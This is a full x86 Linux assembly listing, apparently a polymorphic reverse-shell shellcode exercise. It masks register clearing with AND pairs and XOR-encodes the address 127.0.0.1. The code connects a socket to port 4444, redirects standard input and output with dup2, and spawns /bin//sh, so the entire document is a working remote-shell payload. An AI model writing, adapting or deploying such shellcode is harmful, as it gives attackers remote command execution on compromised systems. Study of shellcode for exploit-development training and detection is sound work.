global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    ;xor   eax, eax
and ecx, 0x01010101
and ecx, 0x02020202
and edx, 0x01010101
and edx, 0x02020202

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
    mov   eax, 0xffffffff
    xor eax, 0xfeffff80
    push eax
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
and eax, 0x01010101
and eax, 0x02020202
sub ebx, ebx
mov ax, 0x168
 dec ax
mov bl, 0x01
 inc bl
mov cl, 0x02
 dec cl
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
and ecx, 0x01010101
and ecx, 0x02020202
    mov   cl, 0x3
    dup:
and eax, 0x01010101
and eax, 0x02020202
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
sub eax, eax
and edx, 0x01010101
and edx, 0x02020202
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
mov al, 0x0c
 dec al
    int   0x80